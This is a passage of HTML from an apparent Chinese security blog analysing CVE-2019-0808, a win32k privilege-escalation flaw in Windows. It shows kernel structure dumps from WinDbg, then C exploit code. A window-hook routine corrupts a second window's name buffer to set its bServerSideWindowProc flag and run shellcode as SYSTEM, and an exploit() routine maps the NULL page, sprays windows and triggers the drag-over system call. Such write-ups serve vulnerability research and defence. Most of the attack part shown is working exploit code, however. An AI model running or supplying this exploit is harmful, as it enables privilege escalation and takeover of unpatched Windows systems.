class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">lkd&gt; dt tagMENU</span><br><span class="line">win32k!tagMENU</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">head             :</span> _PROCDESKHEAD</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">fFlags           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x018</span> <span class="string">iItem            :</span> Int4B</span><br><span class="line">   +<span class="number">0x01c</span> <span class="string">cAlloced         :</span> Uint4B</span><br><span class="line">   +<span class="number">0x020</span> <span class="string">cItems           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x024</span> <span class="string">cxMenu           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x028</span> <span class="string">cyMenu           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> <span class="string">cxTextAlign      :</span> Uint4B</span><br><span class="line">   +<span class="number">0x030</span> <span class="string">spwndNotify      :</span> Ptr32 tagWND</span><br><span class="line">   +<span class="number">0x034</span> <span class="string">rgItems          :</span> Ptr32 tagITEM</span><br><span class="line">   +<span class="number">0x038</span> <span class="string">pParentMenus     :</span> Ptr32 tagMENULIST</span><br><span class="line">   +<span class="number">0x03c</span> <span class="string">dwContextHelpId  :</span> Uint4B</span><br><span class="line">   +<span class="number">0x040</span> <span class="string">cyMax            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x044</span> <span class="string">dwMenuData       :</span> Uint4B</span><br><span class="line">   +<span class="number">0x048</span> <span class="string">hbrBack          :</span> Ptr32 HBRUSH__</span><br><span class="line">   +<span class="number">0x04c</span> <span class="string">iTop             :</span> Int4B</span><br><span class="line">   +<span class="number">0x050</span> <span class="string">iMaxTop          :</span> Int4B</span><br><span class="line">   +<span class="number">0x054</span> <span class="string">dwArrowsOn       :</span> Pos <span class="number">0</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x058</span> <span class="string">umpm             :</span> tagUAHMENUPOPUPMETRICS</span><br><span class="line"></span><br><span class="line">lkd&gt; dt tagUAHMENUPOPUPMETRICS</span><br><span class="line">win32k!tagUAHMENUPOPUPMETRICS</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">rgcx             :</span> [<span class="number">4</span>] Int4B</span><br><span class="line">   +<span class="number">0x010</span> <span class="string">fUpdateMaxWidths :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line"></span><br><span class="line">lkd&gt; dt tagITEM</span><br><span class="line">win32k!tagITEM</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">fType            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fState           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x008</span> <span class="string">wID              :</span> Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> <span class="string">spSubMenu        :</span> Ptr32 tagMENU</span><br><span class="line">   +<span class="number">0x010</span> <span class="string">hbmpChecked      :</span> Ptr32 Void</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">hbmpUnchecked    :</span> Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> <span class="string">lpstr            :</span> Ptr32 Uint2B</span><br><span class="line">   +<span class="number">0x01c</span> <span class="string">cch              :</span> Uint4B</span><br><span class="line">   +<span class="number">0x020</span> <span class="string">dwItemData       :</span> Uint4B</span><br><span class="line">   +<span class="number">0x024</span> <span class="string">xItem            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x028</span> <span class="string">yItem            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> <span class="string">cxItem           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x030</span> <span class="string">cyItem           :</span> Uint4B</span><br><span class="line">   +<span class="number">0x034</span> <span class="string">dxTab            :</span> Uint4B</span><br><span class="line">   +<span class="number">0x038</span> <span class="string">ulX              :</span> Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> <span class="string">ulWidth          :</span> Uint4B</span><br><span class="line">   +<span class="number">0x040</span> <span class="string">hbmp             :</span> Ptr32 HBITMAP__</span><br><span class="line">   +<span class="number">0x044</span> <span class="string">cxBmp            :</span> Int4B</span><br><span class="line">   +<span class="number">0x048</span> <span class="string">cyBmp            :</span> Int4B</span><br><span class="line">   +<span class="number">0x04c</span> <span class="string">umim             :</span> tagUAHMENUITEMMETRICS</span><br><span class="line"></span><br><span class="line">lkd&gt; dt win32k!tagMENUSTATE</span><br><span class="line">   +<span class="number">0x000</span> <span class="string">pGlobalPopupMenu :</span> Ptr32 tagPOPUPMENU</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fMenuStarted     :</span> Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fIsSysMenu       :</span> Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInsideMenuLoop  :</span> Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fButtonDown      :</span> Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInEndMenu       :</span> Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fUnderline       :</span> Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fButtonAlwaysDown :</span> Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fDragging        :</span> Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fModelessMenu    :</span> Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInCallHandleMenuMessages :</span> Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fDragAndDrop     :</span> Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fAutoDismiss     :</span> Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fAboutToAutoDismiss :</span> Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fIgnoreButtonUp  :</span> Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fMouseOffMenu    :</span> Pos <span class="number">14</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fInDoDragDrop    :</span> Pos <span class="number">15</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fActiveNoForeground :</span> Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fNotifyByPos     :</span> Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">fSetCapture      :</span> Pos <span class="number">18</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x004</span> <span class="string">iAniDropDir      :</span> Pos <span class="number">19</span>, <span class="number">5</span> Bits</span><br><span class="line">   +<span class="number">0x008</span> <span class="string">ptMouseLast      :</span> tagPOINT</span><br><span class="line">   +<span class="number">0x010</span> <span class="string">mnFocus          :</span> Int4B</span><br><span class="line">   +<span class="number">0x014</span> <span class="string">cmdLast          :</span> Int4B</span><br><span class="line">   +<span class="number">0x018</span> <span class="string">ptiMenuStateOwner :</span> Ptr32 tagTHREADINFO</span><br><span class="line">   +<span class="number">0x01c</span> <span class="string">dwLockCount      :</span> Uint4B</span><br><span class="line">   +<span class="number">0x020</span> <span class="string">pmnsPrev         :</span> Ptr32 tagMENUSTATE</span><br><span class="line">   +<span class="number">0x024</span> <span class="string">ptButtonDown     :</span> tagPOINT</span><br><span class="line">   +<span class="number">0x02c</span> <span class="string">uButtonDownHitArea :</span> Uint4B</span><br><span class="line">   +<span class="number">0x030</span> <span class="string">uButtonDownIndex :</span> Uint4B</span><br><span class="line">   +<span class="number">0x034</span> <span class="string">vkButtonDown     :</span> Int4B</span><br><span class="line">   +<span class="number">0x038</span> <span class="string">uDraggingHitArea :</span> Uint4B</span><br><span class="line">   +<span class="number">0x03c</span> <span class="string">uDraggingIndex   :</span> Uint4B</span><br><span class="line">   +<span class="number">0x040</span> <span class="string">uDraggingFlags   :</span> Uint4B</span><br><span class="line">   +<span class="number">0x044</span> <span class="string">hdcWndAni        :</span> Ptr32 HDC__</span><br><span class="line">   +<span class="number">0x048</span> <span class="string">dwAniStartTime   :</span> Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> <span class="string">ixAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x050</span> <span class="string">iyAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x054</span> <span class="string">cxAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x058</span> <span class="string">cyAni            :</span> Int4B</span><br><span class="line">   +<span class="number">0x05c</span> <span class="string">hbmAni           :</span> Ptr32 HBITMAP__</span><br><span class="line">   +<span class="number">0x060</span> <span class="string">hdcAni           :</span> Ptr32 HDC__</span><br><span class="line"></span><br><span class="line">typedef struct tagMENUWND &#123;</span><br><span class="line">    tagWND         wnd;         <span class="comment">// size = 0xaf</span></span><br><span class="line">    tagPOPUPMENU*  ppopupmenu; <span class="comment">// offset = 0xb0</span></span><br><span class="line">&#125; MENUWND, *PMENUWND;</span><br></pre></td></tr></table></figure>

<h4 id="修改标识"><a href="#修改标识" class="headerlink" title="修改标识"></a>修改标识</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">WindowHookProc</span><span class="params">(INT code, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	tagCWPSTRUCT* cwp = (tagCWPSTRUCT*)lParam;</span><br><span class="line">	<span class="comment">// 等待拖动鼠标事件</span></span><br><span class="line">	<span class="keyword">if</span> (!bOnDraging) &#123;</span><br><span class="line">		<span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, wParam, lParam);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 修改窗口消息处理函数为 SubMenuProc</span></span><br><span class="line">	<span class="keyword">if</span> ((cwp-&gt;message == WM_MN_FINDMENUWINDOWFROMPOINT))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[*] Update window[%p] proc to SubMenuProc \n"</span>, cwp-&gt;hwnd);</span><br><span class="line">		SetWindowLongW(cwp-&gt;hwnd, GWLP_WNDPROC, (ULONG64)SubMenuProc);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 当xxxMNSetGapState调用后，内核将向窗口发送0x1E5消息（是个谜，没资料）</span></span><br><span class="line">	<span class="comment">// 可以让内核去开始修改各种标识了</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ((cwp-&gt;message == <span class="number">0x1E5</span>)) &#123;</span><br><span class="line">			UINT offset = <span class="number">0</span>;</span><br><span class="line">			<span class="comment">// 计算第一个窗口的数据段起始位置</span></span><br><span class="line">			UINT addressOfStartofPrimaryWndCbWndData = (primaryWindowAddress + <span class="number">0xB0</span>);</span><br><span class="line">			<span class="comment">// 计算第二个窗口的 strName.Buffer 字段，到第一个窗口的数据段起始偏移</span></span><br><span class="line">			offset = ((secondaryWindowAddress + <span class="number">0x8C</span>) - addressOfStartofPrimaryWndCbWndData);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[*] Offset: 0x%08X\r\n"</span>, offset);</span><br><span class="line">			<span class="comment">// 修改 hSecondaryWindow 窗口的 strName.Buffer 指向其 bServerSideWindowProc标识 (secondaryWindowAddress + 0x16)</span></span><br><span class="line">			<span class="keyword">if</span> (SetWindowLongA(hPrimaryWindow, offset, (secondaryWindowAddress + <span class="number">0x16</span>)) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[!] SetWindowLongA malicious error: 0x%08X\r\n"</span>, GetLastError());</span><br><span class="line">				ExitProcess(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[*] SetWindowLongA called to set strName.Buffer : 0x%08X\r\n"</span>, (addressOfStartofPrimaryWndCbWndData + offset));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">// 修改 hSecondaryWindow 窗口的 bServerSideWindowProc 标识所在字节为 \x06</span></span><br><span class="line">			<span class="keyword">if</span> (SetWindowTextA(hSecondaryWindow, <span class="string">"\x06"</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[!] SetWindowTextA couldn't set the bServerSideWindowProc bit. Error was: 0x%08X\r\n"</span>, GetLastError());</span><br><span class="line">				ExitProcess(<span class="number">-1</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[*] Successfully set the bServerSideWindowProc bit at: 0x%08X\r\n"</span>, (secondaryWindowAddress + <span class="number">0x16</span>));</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">"[*] Sending hSecondaryWindow a WM_ENTERIDLE message to trigger the execution of the shellcode as SYSTEM.\r\n"</span>);</span><br><span class="line">				SendMessageA(hSecondaryWindow, WM_ENTERIDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">				<span class="keyword">if</span> (success == TRUE) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"[*] Successfully exploited CVE-2019-0808 and triggered the shellcode!\r\n"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">"[!] Didn't exploit the program. For some reason our privileges were not appropriate.\r\n"</span>);</span><br><span class="line">					ExitProcess(<span class="number">-1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(<span class="number">0</span>, code, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">exploit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD currentThreadId = GetCurrentThreadId();</span><br><span class="line">	DWORD currentProcessId = GetCurrentProcessId();</span><br><span class="line">	HINSTANCE hInst = GetModuleHandleA(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	pfnNtAllocateVirtualMemory = (NTAllocateVirtualMemory)GetProcAddress(GetModuleHandle(<span class="string">L"ntdll.dll"</span>), <span class="string">"NtAllocateVirtualMemory"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置窗口消息钩子</span></span><br><span class="line">	SetWindowsHookExW(WH_CALLWNDPROC, (HOOKPROC)WindowHookProc, hInst, currentThreadId);</span><br><span class="line">	<span class="comment">// 菜单弹出事件钩子，由 TrackPopupMenuEx 触发</span></span><br><span class="line">	DWORD dwEventID = EVENT_SYSTEM_MENUPOPUPSTART;</span><br><span class="line">	SetWinEventHook(dwEventID, dwEventID, hInst, DisplayEventProc, currentProcessId, currentThreadId, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 分配零地址内存</span></span><br><span class="line">	<span class="keyword">if</span> (allocateNullPage() == FALSE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Couldn't allocate the NULL page!\r\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[*] Allocated the NULL page!\r\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	HMODULE hUser32 = LoadLibraryW(<span class="string">L"user32.dll"</span>);</span><br><span class="line">	HMODULE hGdi32 = LoadLibraryW(<span class="string">L"gdi32.dll"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 找到 HMValidateHandle 函数在 user32.dll 中的地址</span></span><br><span class="line">	<span class="keyword">if</span> (findHMValidateHandleAddress(hUser32) == FALSE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Couldn't locate the address of HMValidateHandle!\r\n"</span>);</span><br><span class="line">		ExitProcess(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 窗口喷射寻找内核写入地址</span></span><br><span class="line">	<span class="keyword">if</span> (sprayWindows() == FALSE) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[!] Couldn't find two tagWND objects less than 0x3fd00 apart in memory after the spray!\r\n"</span>);</span><br><span class="line">		ExitProcess(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 触发漏洞的窗口, 这个窗口的内部成员 tagPOPUPMENU 没有设置，多数成员为0</span></span><br><span class="line">	<span class="comment">// hWndFakeWindow 菜单的 spMenu 为 NULL，触发漏洞</span></span><br><span class="line">	hWndFakeWindow = CreateWindowA(<span class="string">"#32768"</span>, <span class="string">"MN"</span>, WS_DISABLED, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, hInst, <span class="literal">nullptr</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"[*] FakeWindow: %p \n"</span>, hWndFakeWindow);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建2个拥有拖拽功能的菜单项</span></span><br><span class="line">	HMENU hMenuRoot = CreatePopupMenu();</span><br><span class="line">	HMENU hMenuSub = CreatePopupMenu();</span><br><span class="line">	MENUINFO mi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	mi.cbSize = <span class="keyword">sizeof</span>(MENUINFO);</span><br><span class="line">	mi.fMask = MIM_STYLE;</span><br><span class="line">	mi.dwStyle = MNS_MODELESS | MNS_DRAGDROP;</span><br><span class="line">	SetMenuInfo(hMenuRoot, &amp;mi);</span><br><span class="line">	SetMenuInfo(hMenuSub, &amp;mi);</span><br><span class="line">	AppendMenuA(hMenuRoot, MF_BYPOSITION | MF_POPUP, (UINT_PTR)hMenuSub, <span class="string">"Root"</span>);</span><br><span class="line">	AppendMenuA(hMenuSub, MF_BYPOSITION | MF_POPUP, <span class="number">0</span>, <span class="string">"Sub"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 注册并创建窗口，绑定窗口菜单</span></span><br><span class="line">	<span class="comment">// 窗口消息处理函数设置为系统默认的 DefWindowProc</span></span><br><span class="line">	<span class="comment">// 为应用程序没有处理的任何窗口消息提供缺省的处理</span></span><br><span class="line">	WNDCLASSEXA wndClass = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	wndClass.cbSize = <span class="keyword">sizeof</span>(WNDCLASSEXA);</span><br><span class="line">	wndClass.lpfnWndProc = DefWindowProc;</span><br><span class="line">	wndClass.cbClsExtra = <span class="number">0</span>;</span><br><span class="line">	wndClass.cbWndExtra = <span class="number">0</span>;</span><br><span class="line">	wndClass.hInstance = hInst;</span><br><span class="line">	wndClass.lpszMenuName = <span class="number">0</span>;</span><br><span class="line">	wndClass.lpszClassName = <span class="string">"_rand_class_name_"</span>;</span><br><span class="line">	RegisterClassExA(&amp;wndClass);</span><br><span class="line">	hWndMain = CreateWindowA(<span class="string">"_rand_class_name_"</span>, <span class="string">"_rand_window_name_"</span>, WS_DISABLED, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="literal">nullptr</span>, <span class="literal">nullptr</span>, hInst, <span class="literal">nullptr</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 弹出菜单</span></span><br><span class="line">	TrackPopupMenuEx(hMenuRoot, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, hWndMain, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 消息循环</span></span><br><span class="line">	MSG msg = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">while</span> (GetMessageW(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		TranslateMessage(&amp;msg);</span><br><span class="line">		DispatchMessageW(&amp;msg);</span><br><span class="line">		<span class="comment">// NtUserMNDragOver() 调用后， iMenuCreated 会累加，调用后马上结束消息循环</span></span><br><span class="line">		<span class="keyword">if</span> (iMenuCreated &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">			bOnDraging = TRUE;</span><br><span class="line">			CHAR buf[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">			POINT pt;</span><br><span class="line">			pt.x = <span class="number">2</span>;</span><br><span class="line">			pt.y = <span class="number">2</span>;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"[+] callNtUserMNDragOverSysCall\n"</span>);</span><br><span class="line">			callNtUserMNDragOverSysCall(&amp;pt, buf); <span class="comment">// 通过内核调用，开始触发</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



            
            <div class="post-reward">
                <a id="rewardBtn" href="javascript:;" class="post-reward-btn waves-effect waves-circle waves-light">赏</a>
            </div>
            
            
            <blockquote>
                <p>
                本文地址：
                <a href="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/" target="_blank" rel="external">http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/</a>
                </p>
                <footer><cite><a href="http://lahonja.me">@大大黄的博客</a></cite></footer>
            </blockquote>
            </div>
            
<nav class="post-nav">
  

  
    <div class="waves-block waves-effect next fr">
      <a href="/2019/08/07/结合CVE-2019-1040分析NTLM中继攻击/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">结合CVE-2019-1040分析NTLM中继攻击</h4>
      </a>
    </div>
  
</nav>


            
            
<div class="duoshuo">
	<!-- 多说评论框 start -->
	<div class="ds-thread" data-thread-key="CVE-2019-0808详细分析" data-title="CVE-2019-0808详细分析" data-url="http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/index.html"></div>
	<!-- 多说评论框 end -->
	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
	<script type="text/javascript">
	var duoshuoQuery = {short_name:"ysblog"};
	(function() {
		var ds = document.createElement('script');
		ds.type = 'text/javascript';ds.async = true;
		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
		ds.charset = 'UTF-8';
		(document.getElementsByTagName('head')[0] 
		 || document.getElementsByTagName('body')[0]).appendChild(ds);
	})();
	</script>
	<!-- 多说公共JS代码 end -->
</div>





        </div>
    </div>
</article>

<div id="reward" class="reward-lay">
    <a class="reward-off" id="rewardOff" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        谢谢大爷~
        <i class="icon icon-quote-right"></i>
    </h3>
    <ul class="reward-items">
        
        <li>
            <img src="/img/wechat.jpg" title="微信打赏二维码" alt="微信打赏二维码">
            <p>微信</p>
        </li>
        

        
        <li>
            <img src="/img/alipay.jpg" title="支付宝打赏二维码" alt="支付宝打赏二维码">
            <p>支付宝</p>
        </li>
        
    </ul>
</div>

    </div>
  </main>
<div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>

<script>
var BLOG_SHARE = {
    title: "CVE-2019-0808详细分析",
    pic: "/img/logo.jpg",
    summary: document.getElementsByName('summary')[0].content,
    url: "http://lahonja.me/2019/10/10/CVE-2019-0808详细分析/index.html"
};
</script>
<div class="global-share" id="global-share">
    <div class="tit">分享到：</div>
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" href="javascript:;" data-title="微博" data-service="tsina">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns" href="javascript:;" data-title="微信" data-service="weixin">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" href="javascript:;" data-title=" QQ" data-service="cqq">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" href="javascript:;" data-title=" Facebook" data-service="fb">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" href="javascript:;" data-title=" Twitter" data-service="twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="douban share-sns" href="javascript:;" data-title="豆瓣" data-service="douban">
          豆
        </a>
      </li>
    </ul>
 </div>


<script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>

<script src="/js/main.js"></script>



<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<script type="text/template" id="search-tpl">
<li class="item">
    <a href="/{path}" class="waves-block waves-effect">
